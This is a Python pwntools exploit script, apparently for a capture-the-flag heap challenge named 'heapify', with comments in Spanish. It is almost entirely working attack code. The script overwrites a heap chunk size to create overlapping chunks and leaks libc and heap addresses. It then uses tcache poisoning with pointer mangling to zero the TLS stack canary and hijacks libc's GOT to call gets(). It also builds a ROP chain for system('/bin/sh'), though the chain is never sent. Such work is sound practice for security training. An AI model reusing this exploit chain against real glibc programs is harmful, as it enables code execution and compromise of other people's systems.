from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
c
'''.format(**locals())

#b *(free+0x6a)
#b *(alloc +89)

exe = './heapify_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

def i2b(val: int):
    return str(val).encode()

def req2sz(val: int):
    SIZE_SZ = context.bytes
    MALLOC_ALIGNMENT = 2*SIZE_SZ
    MALLOC_ALIGN_MASK = MALLOC_ALIGNMENT - 1
    MIN_CHNK_SZ = SIZE_SZ * 4

    MIN_SZ = (MIN_CHNK_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK

    if val + SIZE_SZ + MALLOC_ALIGN_MASK < MIN_SZ:
        return MIN_SZ
    
    return (val + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK

class Chall:
    def __init__(self):
        self.io = start()
        self.max_allocs = 32
        self.nallocs = 0
    
    def alloc(self, size: int, content: bytes):
        self.nallocs += 1

        self.io.sendlineafter(b"choice: ", i2b(1))
        self.io.sendlineafter(b"size: ", i2b(size))
        self.io.sendlineafter(b"data: ", content)
        self.io.recvuntil(b"index: ")
        return int(self.io.recvuntil(b"\n", drop=True).decode())
    
    def free(self, idx: int):
        self.io.sendlineafter(b"choice: ", i2b(2))
        self.io.sendlineafter(b"index: ", i2b(idx))
    
    def view(self, idx: int):
        self.io.sendlineafter(b"choice: ", i2b(3))
        self.io.sendlineafter(b"index: ", i2b(idx))
        return self.io.recvuntil(b"\n", drop=True)
    
    def exit(self):
        self.io.sendlineafter(b"choice: ", i2b(4))

def fuzz(start: int = 0, end: int = 0x1f000):
    payload = []
    mask = 0x696969
    j = 0
    for i in range(start, end):
        if j & 0xff == 0x0a:
            j += 1
            mask -= 1
        val = (j << 24) | mask
        payload.append(val)
        j += 1
    return payload

def ptr_mangle(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

#r8 = &(heap_base + 0xcac)

def gen_rip_rdi_control_payload():
    return gen_payload(0x20, [0x696969, libc.sym['gets']])

def gen_payload(offset:int, rop_chain = []):
    #https://github.com/n132/Libc-GOT-Hijacking/tree/main/Pre#fx2---0x1f0
    #got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    got = libc.address + libc.get_section_by_name(".got.plt").header.sh_addr + 0x18
    print(f"Got: {hex(got)}")

    return got+offset, flat(rop_chain)

    
if __name__ == "__main__":
    chall = Chall()

    chnk_sz = 0x200
    huge_chnk_sz = (2 * chnk_sz) + 0x10

    chall.alloc(chnk_sz, b"Y"*0x18) # uno antes del chunk este raro de proteccion

    A = chall.alloc(huge_chnk_sz, b"A"*huge_chnk_sz)
    B = chall.alloc(chnk_sz, b"B"*chnk_sz)
    C = chall.alloc(chnk_sz, b"C"*chnk_sz)

    chall.alloc(0x18, b"Y"*0x18) # limit with top chunk

    chall.free(A) # A goes to unsorted bin

    content = b"D"*huge_chnk_sz + p64(0x0) + p64(req2sz(huge_chnk_sz)| 0x1) #sobreescribo size de B para que sea mas grande
    A = chall.alloc(huge_chnk_sz, content)

    E = chall.alloc(huge_chnk_sz, b"Y"*huge_chnk_sz) #por lo que sea, si no hago esto explota, tiene que ver
    # con que las alocaciones se copian en el chunk este falso de entre medias

    chall.free(B) # B goes to unsorted

    B = chall.alloc(chnk_sz, b"E"*0x10) # parto B para que las direcciones se escriban al comienzo de C

    libc_leak = u64(chall.view(C).ljust(8, b"\x00"))
    libc.address = libc_leak - 0x1d2cc0
    tls_address = libc.address - 0x3000

    log.success(f"Libc leak {hex(libc.address)}")
    log.success(f"Tls leak {hex(tls_address)}")

    D = chall.alloc(chnk_sz, b"E"*0x10) # dejo el heap limpio (quito el restante de unsorted bin)
    #ahora D y C apuntan al mismo chunk

    chall.free(D) # D (C) goes to tcache bin

    heap_mask = u64(chall.view(C).ljust(8, b"\x00"))
    heap_base = (heap_mask << 12) - 0x1000
    log.success(f"Heap leak: {hex(heap_base)}")

    D = chall.alloc(chnk_sz, b"E"*0x10) # dejo el heap limpio otra vez
    '''
    --------
    0x420 <-A
    --------
    0x210 <-B
    --------
    0x210 <-C == D 
    --------
    0x20 limit
    --------
    0x420 <-E
    --------
    0x1ede0 top
    '''
    ##### TCACHE POISONING #####

    #### overwrite canary in tls ####

    buf1 = chall.alloc(chnk_sz, b"buf1")
    buf2 = chall.alloc(chnk_sz, b"buf2")

    '''
    ...
     0x20 limit
    --------
    0x420 <-E
    --------
    0x200 <-buf1
    --------
    0x200 <-buf2
    --------
    0x1ede0 top
    '''

    chall.free(buf2)
    chall.free(buf1) #tcache_bin[0x200]: buf1 -> buf2
    chall.free(E)

    buf1_chnk_addr = heap_base + 0x2140
    canary_tls = tls_address + 0x768
    target_mangled = ptr_mangle(buf1_chnk_addr, canary_tls - 0x8) #-0x8 para alinear a 0x8

    content =   b"E"*huge_chnk_sz + \
                p64(0x0) + p64(req2sz(chnk_sz)) + \
                p64(target_mangled)
    E = chall.alloc(huge_chnk_sz, content)

    buf1 = chall.alloc(chnk_sz, b"buf1") 
    win = chall.alloc(chnk_sz, p64(0x0)*3) #overwrite canary to 0x0

    #### get bof in stack ####

    target, val = gen_rip_rdi_control_payload() 
    B_chnk_addr = heap_base + 0x18e0 #es necesario saber donde se guarda el puntero fd para hacer el mangleo
    target_mangled = ptr_mangle(B_chnk_addr, target)

    chall.free(D)
    chall.free(B)

    #para poder sobreescribir B->fd tengo que abusar del gets()
    chall.free(A)
    content =   b"E"*huge_chnk_sz + \
                p64(0x0) + p64(req2sz(chnk_sz)) + \
                p64(target_mangled) # para alinearlo
    A = chall.alloc(huge_chnk_sz, content) # sobreescribo los chunks en tcache bin
    # tcache_bin[ buf2 -> target]
    B = chall.alloc(chnk_sz, b"B") 
    # C se queda en un UAF raro

    chall.io.sendlineafter(b"choice: ", i2b(1)) #chall.alloc() no sirve porque se queda esperando a b"choice"
    chall.io.sendlineafter(b"size: ", i2b(chnk_sz))
    chall.io.sendlineafter(b"data: ", val)
    pattern = b"A"*(0x8000)
    print("quedate con rdi")
    chall.io.sendline(pattern)# gets(&stack)

#b*(gets+0xda)
#rdi: 0x00007ffd8dd40690
#

    #chunk_at_arb_addr = chall.alloc(chnk_sz, val) # arbitrary write
    rop_chain = [
                ROP(libc).find_gadget(["pop rdi", "ret"]).address,  \
                next(libc.search(b"/bin/sh\x00")),                  \
                libc.sym['system']                                  \
                ]

    chall.io.interactive()
    chall.io.close()
